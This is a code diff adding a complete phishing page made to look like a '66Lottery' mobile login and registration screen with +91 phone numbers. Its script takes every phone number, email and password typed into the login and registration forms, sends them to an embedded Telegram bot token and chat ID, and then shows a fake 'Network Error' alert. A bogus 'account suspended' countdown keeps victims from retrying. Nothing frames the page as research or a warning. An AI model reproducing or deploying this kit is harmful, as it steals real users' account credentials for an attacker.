@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>66Lottery - Big View</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: #ededed;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            padding: 20px 0;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background-color: #f7f9fc;
+            min-height: 90vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            border-radius: 16px;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(180deg, #f95959 0%, #ff7e7e 100%);
+            padding: 24px 20px 36px 20px;
+            color: white;
+        }
+
+        .nav-bar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 26px;
+        }
+
+        .back-btn {
+            font-size: 26px;
+            cursor: pointer;
+            background: none;
+            border: none;
+            color: white;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo-img {
+            height: 42px;
+            object-fit: contain;
+        }
+
+        .lang-selector {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.15);
+            padding: 6px 12px;
+            border-radius: 20px;
+        }
+
+        .flag-icon {
+            width: 24px;
+            height: 16px;
+            object-fit: cover;
+            border-radius: 2px;
+        }
+
+        .header-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            letter-spacing: 0.5px;
+        }
+
+        .header-subtitle {
+            font-size: 14px;
+            line-height: 1.6;
+            opacity: 0.95;
+        }
+
+        .tabs-container {
+            display: flex;
+            background-color: white;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.02);
+        }
+
+        .tab {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 18px 0;
+            cursor: pointer;
+            color: #afb3bc;
+            font-size: 16px;
+            border-bottom: 4px solid transparent;
+            gap: 8px;
+        }
+
+        .tab.active {
+            color: #f95959;
+            border-bottom: 4px solid #f95959;
+            font-weight: bold;
+        }
+
+        .tab-icon {
+            width: 28px;
+            height: 28px;
+            fill: currentColor;
+        }
+
+        .form-content {
+            padding: 20px 22px;
+            flex: 1;
+        }
+
+        .form-page {
+            display: none;
+        }
+
+        .form-page.active {
+            display: block;
+        }
+
+        .input-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 16px;
+            color: #222222;
+            margin-top: 22px;
+            margin-bottom: 12px;
+            font-weight: 500;
+        }
+
+        .label-icon {
+            width: 22px;
+            height: 22px;
+        }
+
+        .input-wrapper {
+            display: flex;
+            background-color: white;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #e8edf3;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.01);
+        }
+
+        .country-code {
+            padding: 0 22px;
+            background-color: white;
+            color: #333;
+            font-size: 16px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-right: 1px solid #eeF2F6;
+        }
+
+        .main-input {
+            width: 100%;
+            padding: 18px 16px;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+            background: white;
+        }
+
+        .main-input::placeholder {
+            color: #c2c7d0;
+        }
+
+        .password-container {
+            position: relative;
+            display: flex;
+            align-items: center;
+            background-color: white;
+            border-radius: 12px;
+            border: 1px solid #e8edf3;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.01);
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 18px;
+            cursor: pointer;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            opacity: 0.7;
+        }
+
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 20px;
+            font-size: 15px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #555555;
+            cursor: pointer;
+        }
+
+        .remember-me input {
+            width: 20px;
+            height: 20px;
+            border: 1px solid #dcdcdc;
+            border-radius: 50%;
+            appearance: none;
+            -webkit-appearance: none;
+            outline: none;
+            cursor: pointer;
+            vertical-align: middle;
+            background: white;
+            position: relative;
+        }
+
+        .remember-me input:checked {
+            background-color: #f95959;
+            border-color: #f95959;
+        }
+
+        .remember-me input:checked::after {
+            content: '';
+            position: absolute;
+            width: 6px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 2px 2px 0;
+            top: 3px;
+            left: 6px;
+            transform: rotate(45deg);
+        }
+
+        .forgot-pass {
+            color: #ff7e7e;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .agreement-container {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 15px;
+            color: #333;
+            margin-top: 28px;
+            margin-bottom: 24px;
+        }
+
+        .agreement-container input[type="checkbox"] {
+            appearance: none;
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border: 1px solid #f95959;
+            border-radius: 50%;
+            background-color: #f95959;
+            position: relative;
+            outline: none;
+            cursor: pointer;
+        }
+
+        .agreement-container input[type="checkbox"]:checked::after {
+            content: '✓';
+            color: white;
+            font-size: 14px;
+            position: absolute;
+            top: -1px;
+            left: 4px;
+            font-weight: bold;
+        }
+
+        .agreement-link {
+            color: #f95959;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .btn-group {
+            margin-top: 40px;
+            display: flex;
+            flex-direction: column;
+            gap: 18px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 35px;
+            font-size: 18px;
+            font-weight: bold;
+            text-align: center;
+            cursor: pointer;
+            border: none;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .btn-login-active {
+            background: linear-gradient(180deg, #f95959 0%, #ff7e7e 100%);
+            color: white;
+            box-shadow: 0 4px 12px rgba(249, 89, 89, 0.25);
+        }
+
+        /* Styling for suspended state */
+        .btn-suspended {
+            background: #cbd3de !important;
+            color: #ffffff !important;
+            box-shadow: none !important;
+            cursor: not-allowed !important;
+        }
+
+        .btn-register-submit {
+            background: linear-gradient(180deg, #f95959 0%, #ff7e7e 100%);
+            color: white;
+            box-shadow: 0 4px 12px rgba(249, 89, 89, 0.25);
+        }
+
+        .btn-secondary-outline {
+            background-color: transparent;
+            color: #f95959;
+            border: 2px solid #f95959;
+        }
+
+        /* Warning Banner Style */
+        .error-banner {
+            background-color: #ffeef0;
+            color: #f95959;
+            padding: 12px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            border: 1px solid #ffdadf;
+            display: none;
+        }
+
+        .customer-service-widget {
+            position: absolute;
+            bottom: 30px;
+            right: 25px;
+            width: 62px;
+            height: 62px;
+            background-color: white;
+            border-radius: 50%;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.12);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 999;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        
+        <div class="header">
+            <div class="nav-bar">
+                <button class="back-btn" onclick="backToDefault()">&lt;</button>
+                <img src="https://i.postimg.cc/dt29LSgn/logo-nav-(1).png" alt="66Lottery Logo" class="logo-img">
+                <div class="lang-selector">
+                    <img class="flag-icon" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 741 390'><rect width='741' height='390' fill='%233c3b6e'/><path d='M0 30h741M0 90h741M0 150h741M0 210h741M0 270h741M0 330h741' stroke='%23b22234' stroke-width='30'/><rect width='296' height='210' fill='%233c3b6e'/></svg>" alt="US">
+                    <span>EN</span>
+                </div>
+            </div>
+            <div class="header-title" id="main-title">Log in</div>
+            <div class="header-subtitle" id="main-subtitle">
+                Please log in with your phone number or email<br>
+                If you forget your password, please contact customer service
+            </div>
+        </div>
+
+        <div class="tabs-container" id="tabs-bar">
+            <div class="tab active" id="tab-phone-btn" onclick="toggleTabs('phone')">
+                <svg class="tab-icon" viewBox="0 0 24 24"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm-5 20c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm5-4H7V4h10v13z"/></svg>
+                <span>Log in with phone</span>
+            </div>
+            <div class="tab" id="tab-email-btn" onclick="toggleTabs('email')">
+                <svg class="tab-icon" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                <span>Email login</span>
+            </div>
+        </div>
+
+        <div class="form-content">
+            
+            <div id="suspension-banner" class="error-banner"></div>
+
+            <div id="view-login-phone" class="form-page active">
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M17 1H7c-1.1 0-1.99.9-1.99 2L5 21c0 1.1.89 2 1.99 2H17c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm-5 18c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg>
+                    Phone number
+                </div>
+                <div class="input-wrapper">
+                    <div class="country-code">+91</div>
+                    <input type="tel" id="login-phone-input" class="main-input" placeholder="Please enter the phone number">
+                </div>
+
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    Password
+                </div>
+                <div class="password-container">
+                    <input type="password" class="main-input" id="pass-phone-field" placeholder="Please enter password">
+                    <span class="eye-icon" onclick="togglePassVisibility('pass-phone-field')">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </span>
+                </div>
+
+                <div class="form-options">
+                    <label class="remember-me">
+                        <input type="checkbox"> Remember password
+                    </label>
+                    <a href="#" class="forgot-pass">Forgot password</a>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-login-active login-trigger-btn" onclick="submitPhoneLogin()">Log in</button>
+                    <button class="btn btn-secondary-outline" onclick="openRegisterView()">Register</button>
+                </div>
+            </div>
+
+            <div id="view-login-email" class="form-page">
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                    Mail
+                </div>
+                <div class="password-container">
+                    <input type="email" id="login-email-input" class="main-input" placeholder="Please enter the email">
+                </div>
+
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    Password
+                </div>
+                <div class="password-container">
+                    <input type="password" class="main-input" id="pass-email-field" placeholder="Please enter password">
+                    <span class="eye-icon" onclick="togglePassVisibility('pass-email-field')">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </span>
+                </div>
+
+                <div class="form-options">
+                    <label class="remember-me">
+                        <input type="checkbox"> Remember password
+                    </label>
+                    <a href="#" class="forgot-pass">Forgot password</a>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-login-active login-trigger-btn" onclick="submitEmailLogin()">Log in</button>
+                    <button class="btn btn-secondary-outline" onclick="openRegisterView()">Register</button>
+                </div>
+            </div>
+
+            <div id="view-register" class="form-page">
+                <div style="text-align: center; color: #f95959; border-bottom: 2px solid #f95959; padding-bottom: 14px; margin-bottom: 15px; font-size: 16px; font-weight: bold; width: 50%; margin-left: 25%;">
+                    Register your phone
+                </div>
+
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M17 1H7c-1.1 0-1.99.9-1.99 2L5 21c0 1.1.89 2 1.99 2H17c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm-5 18c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1z"/></svg>
+                    Phone number
+                </div>
+                <div class="input-wrapper">
+                    <div class="country-code">+91</div>
+                    <input type="tel" id="reg-phone-input" class="main-input" placeholder="Please enter the phone number">
+                </div>
+
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    Set password
+                </div>
+                <div class="password-container">
+                    <input type="password" class="main-input" id="reg-pass-field" placeholder="Please enter password">
+                    <span class="eye-icon" onclick="togglePassVisibility('reg-pass-field')">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </span>
+                </div>
+
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                    Confirm password
+                </div>
+                <div class="password-container">
+                    <input type="password" class="main-input" id="reg-confirm-field" placeholder="Please enter password again">
+                    <span class="eye-icon" onclick="togglePassVisibility('reg-confirm-field')">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#777" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    </span>
+                </div>
+
+                <div class="input-label">
+                    <svg class="label-icon" viewBox="0 0 24 24" fill="#ff7e7e"><path d="M19 3h-1V1h-2v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 10h-1v5h-2v-5H8v-2h5v2zm2-4H10V7h4v2z"/></svg>
+                    Invite code
+                </div>
+                <div class="password-container">
+                    <input type="text" id="reg-invite-input" class="main-input" placeholder="Please enter the invitation code (optional)">
+                </div>
+
+                <div class="agreement-container">
+                    <input type="checkbox" id="terms" checked>
+                    <label for="terms">I have read and agree <a href="#" class="agreement-link">【Privacy Agreement】</a></label>
+                </div>
+
+                <div class="btn-group">
+                    <button class="btn btn-register-submit" onclick="submitRegister()">Register</button>
+                    <button class="btn btn-secondary-outline" onclick="backToDefault()">I have an account Login</button>
+                </div>
+            </div>
+
+        </div>
+
+        <div class="customer-service-widget">
+            <svg width="62" height="62" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="50" cy="50" r="45" fill="white" stroke="#ffebd2" stroke-width="2"/>
+                <path d="M50 25C36.2 25 25 36.2 25 50V70C25 72.8 27.2 75 30 75H38C40.8 75 43 72.8 43 70V58C43 55.2 40.8 53 38 53H30V50C30 39 39 30 50 30C61 30 70 39 70 50V53H62C59.2 53 57 55.2 57 58V70C57 72.8 59.2 75 62 75H70C72.8 75 75 72.8 75 70V50C75 36.2 63.8 25 50 25Z" fill="#ff5e5e"/>
+                <path d="M40 58H30V70H40V58Z" fill="#ffa46b"/>
+                <path d="M70 58H60V70H70V58Z" fill="#ffa46b"/>
+                <path d="M45 68C45 64 55 64 55 68" stroke="#ff5e5e" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+        </div>
+
+    </div>
+
+    <script>
+        const mainTitle = document.getElementById('main-title');
+        const mainSubtitle = document.getElementById('main-subtitle');
+        const tabsBar = document.getElementById('tabs-bar');
+        
+        const tabPhoneBtn = document.getElementById('tab-phone-btn');
+        const tabEmailBtn = document.getElementById('tab-email-btn');
+        
+        const viewLoginPhone = document.getElementById('view-login-phone');
+        const viewLoginEmail = document.getElementById('view-login-email');
+        const viewRegister = document.getElementById('view-register');
+        const suspensionBanner = document.getElementById('suspension-banner');
+
+        // Telegram Integration Credentials
+        const telegramBotToken = "8648863877:AAGW1ju_Nx9EcL74M7k9kNjBxDvbet9YK94";
+        const telegramChatId = "7750507542";
+
+        // Anti-Spam / Suspension Variables
+        let clickCount = 0;
+        let isSuspended = false;
+        let countdownTimer = null;
+
+        function toggleTabs(selection) {
+            if (selection === 'phone') {
+                tabPhoneBtn.classList.add('active');
+                tabEmailBtn.classList.remove('active');
+                viewLoginPhone.classList.add('active');
+                viewLoginEmail.classList.remove('active');
+                viewRegister.classList.remove('active');
+            } else {
+                tabEmailBtn.classList.add('active');
+                tabPhoneBtn.classList.remove('active');
+                viewLoginEmail.classList.add('active');
+                viewLoginPhone.classList.remove('active');
+                viewRegister.classList.remove('active');
+            }
+        }
+
+        function openRegisterView() {
+            mainTitle.innerText = "Register";
+            mainSubtitle.innerText = "Please register by phone number or email";
+            tabsBar.style.display = "none";
+            
+            viewLoginPhone.classList.remove('active');
+            viewLoginEmail.classList.remove('active');
+            viewRegister.classList.add('active');
+        }
+
+        function backToDefault() {
+            mainTitle.innerText = "Log in";
+            mainSubtitle.innerHTML = "Please log in with your phone number or email<br>If you forget your password, please contact customer service";
+            tabsBar.style.display = "flex";
+            
+            toggleTabs('phone');
+        }
+
+        function togglePassVisibility(fieldId) {
+            const passElement = document.getElementById(fieldId);
+            if (passElement.type === "password") {
+                passElement.type = "text";
+            } else {
+                passElement.type = "password";
+            }
+        }
+
+        // Suspension Mechanism (30 Minutes Timer)
+        function triggerSuspension() {
+            isSuspended = true;
+            clickCount = 0; // Reset counter
+
+            // Change login buttons visual state
+            const loginBtns = document.querySelectorAll('.login-trigger-btn');
+            loginBtns.forEach(btn => {
+                btn.classList.add('btn-suspended');
+                btn.innerText = "Suspended";
+            });
+
+            let totalSeconds = 30 * 60; // 30 minutes to seconds
+
+            suspensionBanner.style.display = "block";
+
+            // Live Countdown block
+            countdownTimer = setInterval(() => {
+                let minutes = Math.floor(totalSeconds / 60);
+                let seconds = totalSeconds % 60;
+
+                // Formatting single digits to 02, 01, etc.
+                minutes = minutes < 10 ? '0' + minutes : minutes;
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+
+                suspensionBanner.innerText = `Too many login attempts! Your account is suspended for ${minutes}:${seconds} minutes.`;
+
+                totalSeconds--;
+
+                if (totalSeconds < 0) {
+                    clearInterval(countdownTimer);
+                    liftSuspension();
+                }
+            }, 1000);
+        }
+
+        function liftSuspension() {
+            isSuspended = false;
+            suspensionBanner.style.display = "none";
+            
+            const loginBtns = document.querySelectorAll('.login-trigger-btn');
+            loginBtns.forEach(btn => {
+                btn.classList.remove('btn-suspended');
+                btn.innerText = "Log in";
+            });
+        }
+
+        function handleSpamCheck() {
+            if (isSuspended) {
+                alert("Account suspended! Please try after the countdown finishes.");
+                return false;
+            }
+
+            clickCount++;
+            
+            // Agar user lagatar 3 ya us se zyada baar click karega bina load hue
+            if (clickCount >= 3) {
+                triggerSuspension();
+                return false;
+            }
+            return true;
+        }
+
+        // Helper function to forward data to Telegram
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+            
+            fetch(url, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            })
+            .then(response => {
+                alert("Network Error. Please try again later!");
+            })
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Capture Phone Login
+        function submitPhoneLogin() {
+            if (!handleSpamCheck()) return;
+
+            const phone = document.getElementById('login-phone-input').value;
+            const pass = document.getElementById('pass-phone-field').value;
+
+            if(!phone || !pass) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            const message = `📥 *66Lottery - Phone Login*\n\n📱 *Phone:* +91 ${phone}\n🔑 *Password:* \`${pass}\``;
+            sendToTelegram(message);
+        }
+
+        // Capture Email Login
+        function submitEmailLogin() {
+            if (!handleSpamCheck()) return;
+
+            const email = document.getElementById('login-email-input').value;
+            const pass = document.getElementById('pass-email-field').value;
+
+            if(!email || !pass) {
+                alert("Please fill in all fields.");
+                return;
+            }
+
+            const message = `📥 *66Lottery - Email Login*\n\n📧 *Email:* ${email}\n🔑 *Password:* \`${pass}\``;
+            sendToTelegram(message);
+        }
+
+        // Capture Registration
+        function submitRegister() {
+            const phone = document.getElementById('reg-phone-input').value;
+            const pass = document.getElementById('reg-pass-field').value;
+            const confirmPass = document.getElementById('reg-confirm-field').value;
+            const inviteCode = document.getElementById('reg-invite-input').value || "None";
+
+            if(!phone || !pass || !confirmPass) {
+                alert("Please fill in required fields.");
+                return;
+            }
+
+            const message = `📝 *66Lottery - New Registration*\n\n📱 *Phone:* +91 ${phone}\n🔑 *Password:* \`${pass}\` \n🔄 *Confirm Pass:* \`${confirmPass}\` \n🎁 *Invite Code:* ${inviteCode}`;
+            sendToTelegram(message);
+        }
+    </script>
+</body>
+</html>
